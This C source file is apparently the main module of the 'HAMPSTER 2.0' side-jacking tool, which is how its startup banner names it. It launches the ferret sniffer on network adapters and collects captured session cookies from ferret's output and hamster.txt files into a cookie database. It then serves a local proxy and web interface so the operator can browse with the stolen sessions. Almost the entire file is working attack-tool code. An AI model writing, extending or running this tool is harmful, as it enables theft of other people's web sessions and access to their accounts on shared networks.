
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "hamster.h"
#include "cookiedb.h"
#include "platform.h"
#include "pixie.h"		/* cross-platform routines */
#include "mongoose.h"	/* built-in webserver */





/**
 * Whether a configuration parameter starts with a pattern.
 */
static unsigned 
cfg_prefix(const char *name, const char *prefix, unsigned offset)
{
	unsigned i, p;

	if (name[offset] == '.')
		offset++;

	for (i=offset, p=0; name[i] && prefix[p]; i++, p++)
		if (name[i] != prefix[p])
			return 0;
	if (prefix[p] == '\0')
		return i;
	else
		return 0;
}


/**
 * Parses a boolean value, such as true/false or 1/0 or yes/no
 */
unsigned
parse_boolean(const char *value)
{
	switch (value[0]) {
	case '1': /*1*/
	case 'y': /*yes*/
	case 'Y': /*YES*/
	case 'e': /*enabled*/
	case 'E': /*ENABLED*/
	case 't': /*true*/
	case 'T': /*TRUE*/
		return 1;
	case 'o': /*on/off*/
	case 'O': /*ON/OFF*/
		if (value[1] == 'n' || value[1] == 'N')
			return 1;
	}
	return 0;
}


struct MyProx *myprox_create()
{
	struct MyProx *myprox;

	myprox = (struct MyProx*)malloc(sizeof(struct MyProx));
	memset(myprox, 0, sizeof(*myprox));

	return myprox;
}


/**
 * Set a parameter for the proxy server. This should be called after
 * myprox_create(), but before myprox_init().
 */
void myprox_set_parameter(struct MyProx *myprox, const char *name, const char *value)
{
	unsigned x=0;
#define MATCH(str) cfg_prefix(name, str, x) && ((x=cfg_prefix(name, str, x))>0)

	if (MATCH("port")) {
		myprox_set_parameter(myprox, "server.port", value);
	} else
	if (MATCH("server")) {
		if (MATCH("port")) {
			unsigned port;


			port = strtoul(value,0,0);
			if (port == 0 || 65535 < port)
				fprintf(stderr, "%s: bad portnumber: %s=%s\n", "proxy", name, value);
			else {
				if (myprox->server_port)
					fprintf(stderr, "%s: was server.port=%d, now server.port=%d", "proxy", myprox->server_port, port);
				myprox->server_port = port;
			}
			return;
		} else if (MATCH("ip")) {
			unsigned ip = inet_addr(value);

			if ((ip&0xFFFFFFFF) == 0xFFFFFFFF)
				printf("%s: bad value: %s=%s\n", "proxy", name, value);
			else {
				ip = ntohl(ip);

				if (myprox->server_ip)
					fprintf(stderr, "%s: was server.ip=%u.%u.%u.%u, now server.ip=%u.%u.%u.%u", 
					"proxy", 
					P_IP_ADDR(myprox->server_ip), 
					P_IP_ADDR(ip));
				myprox->server_ip = ip;
			}
			return;
		}
	}
	fprintf(stderr, "%s: unknown configuration parameter: %s=%s\n", "proxy", name, value);
}

/**
 * Initialize and start a proxy server. This should be called after myprox_create()
 * and myprox_set_parameter(), but should be called before myprox_dispatch().
 */
unsigned myprox_init(struct MyProx *myprox)
{
	struct sockaddr_in sin;

	memset(&sin, 0, sizeof(sin));

	/* Do the windows socket initialization stuff, if necessary */
#ifdef WIN32
	{WSADATA x; WSAStartup(0x101, &x);}
#endif

	/* Create the socket */
	myprox->fd = socket(AF_INET, SOCK_STREAM,0);
	if (myprox->fd == SOCKET_ERROR) {
		fprintf(stderr, "%s: socket() error=%d\n", "proxy", WSAGetLastError());
		return 1;
	}

	/* If no port set, set to default proxy port */
	if (myprox->server_port == 0)
		myprox->server_port = 3128;

	/* Configure the server-side listening socket */
	sin.sin_addr.s_addr = htonl(myprox->server_ip);
	sin.sin_port = htons((unsigned short)myprox->server_port);
	sin.sin_family = AF_INET;
	if (bind(myprox->fd, 
		(struct sockaddr*)&sin, sizeof(sin)) != 0) {
		fprintf(stderr, "%s: bind() error=%d\n", "proxy", WSAGetLastError());
		closesocket(myprox->fd);
		myprox->fd = -1;
		return 1;
	}

	/* Configure this as a listening socket */
	if (listen(myprox->fd, 5) != 0) {
		fprintf(stderr, "%s: listen() error=%d\n", "proxy", WSAGetLastError());
		closesocket(myprox->fd);
		myprox->fd = -1;
		return 1;
	}

	printf("Set your browser to use proxy at 127.0.0.1 port %d\n", myprox->server_port);
	return 0;
}


void myprox_destroy(struct MyProx *myprox)
{
	UNUSEDPARM(myprox);
}


void myprox_cookie_watcher(void *v_parms)
{
	fpos_t position = {0};
	printf("begining thread\n");
	for (;;) {
		coookiedb_read_file("hamster.txt", &position);
		pixie_sleep(10*1000);
	}
	UNUSEDPARM(v_parms);
}

/**
 * Create a thread that starts a FERRET sniffing program monitoring the specified
 * network interface
 */
void myprox_ferret_thread(void *v_parms)
{
	struct FerretThreadParms *parms = (struct FerretThreadParms*)v_parms;
	struct MyProx *myprox = parms->myprox;
	unsigned i = myprox->adapter_count;
	char args[256];

	/* If we are already monitoring this adapter, then don't start a 
	 * secon thread for it */
	for (i=0; i<myprox->adapter_count; i++) {
		if (strcmp(parms->adaptername, myprox->adapters[i].adaptername) == 0)
			return;
	}


	/* If too many adapters open already, don't open a new one */
	i = myprox->adapter_count;
	if (i >= 16) {
		free(v_parms);
		return;
	}

	/*
	 * create the args
	 */
	pixie_strcpy(myprox->adapters[i].adaptername, sizeof(myprox->adapters[i].adaptername), parms->adaptername);
	pixie_snprintf(args, sizeof(args), "-i %s --hamster", myprox->adapters[i].adaptername);
	myprox->adapter_count++;

	{
		int fd_ferret_stdin;
		int fd_ferret_stdout;
		FILE *fp;

		
		if (pixie_spawn("ferret", args, &fd_ferret_stdin, &fd_ferret_stdout) == 0) {
			fp = fdopen(fd_ferret_stdout, "rt");

			cookiedb_read_file_handle(fp);
		}
	}

	/* Remove the named adapter from the list */
	for (i=0; i<myprox->adapter_count; i++) {
		if (strcmp(parms->adaptername, myprox->adapters[i].adaptername) == 0) {
			memmove(myprox->adapters, myprox->adapters+1, 16-i);
			myprox->adapter_count--;
			break;
		}
	}

}

void hamster_root(struct mg_connection *conn, const struct mg_request_info *ri, void *user_data);
void hamster_left(struct mg_connection *conn, const struct mg_request_info *ri, void *user_data);
void hamster_right(struct mg_connection *conn, const struct mg_request_info *ri, void *user_data);
void hamster_cookies(struct mg_connection *conn, const struct mg_request_info *ri, void *user_data);
void hamster_status(struct mg_connection *conn, const struct mg_request_info *ri, void *user_data);
void hamster_proxy(struct mg_connection *conn, const struct mg_request_info *ri, void *user_data);
void hamster_adapter(struct mg_connection *conn, const struct mg_request_info *ri, void *user_data);
void hamster_startadapter(struct mg_connection *conn, const struct mg_request_info *ri, void *user_data);

/*=========================================================================
 *=========================================================================*/
int main(int argc, char *argv[])
{
	int i;
	struct MyProx *myprox;
	void *mongoose_ctx;
	char listen_port[16];

	printf("--- HAMPSTER 2.0 side-jacking tool ---\n");


	pixie_begin_thread(myprox_cookie_watcher, 0, 0);
	

	coookiedb_read_file("hamster-old-1.txt", NULL);
	coookiedb_read_file("hamster-old-2.txt", NULL);
	coookiedb_read_file("hamster-old-3.txt", NULL);



	/* Create an object */
	myprox = myprox_create();
	myprox->server_port = 1234;
	mongoose_ctx = mg_start();


	/* Set parameters for the object */
	for (i=1; i<argc; i++) {
		char *name;
		char *value;
		if (strchr(argv[i],'=')==NULL) {
			fprintf(stderr, "unknown parm, all parms must be name=value pairs. (%s)\n", argv[i]);
			continue;
		}

		name = strdup(argv[i]);
		value = strchr(name,'=');
		*value = '\0';
		value++;

		if (memcmp(name, "mongoose.", 9) == 0)
			mg_set_option(mongoose_ctx, name+9, value);
		else
			myprox_set_parameter(myprox, name, value);
	}


	/*
	 * Create a built-in webserver, using the "MONGOOSE" simple HTTPD.
	 */
	pixie_snprintf(listen_port, sizeof(listen_port), "%u", myprox->server_port);

	{
		const char *val = mg_get_option(mongoose_ctx, "ip");
		printf("Set browser to use proxy http://%s:%u\n", val, myprox->server_port);
	}


	mg_set_option(mongoose_ctx, "ports", listen_port);

	mg_bind_to_uri(mongoose_ctx, "/", &hamster_root, myprox);
	mg_bind_to_uri(mongoose_ctx, "/left.html", &hamster_left, myprox);
	mg_bind_to_uri(mongoose_ctx, "/right.html", &hamster_right, myprox);
	mg_bind_to_uri(mongoose_ctx, "/cookies.html", &hamster_cookies, myprox);
	mg_bind_to_uri(mongoose_ctx, "/status.xml", &hamster_status, myprox);
	mg_bind_to_uri(mongoose_ctx, "/adapters.html", &hamster_adapter, myprox);
	mg_bind_to_uri(mongoose_ctx, "/startadapter.html", &hamster_startadapter, myprox);
	mg_bind_to_uri(mongoose_ctx, "http", &hamster_proxy, myprox);

	/*
	 * Start listening on the first adapter
	 */
	if (0)
	{
		struct FerretThreadParms *parms;
		parms = (struct FerretThreadParms*)malloc(sizeof(*parms));
		memset(parms, 0, sizeof(*parms));

		pixie_snprintf(parms->adaptername, sizeof(parms->adaptername), "%s", "1");
		parms->myprox = myprox;

		pixie_begin_thread(myprox_ferret_thread, 0, parms);
	}

	for (;;) {
		pixie_sleep(10);
	}

	myprox_destroy(myprox);

	return 0;
}
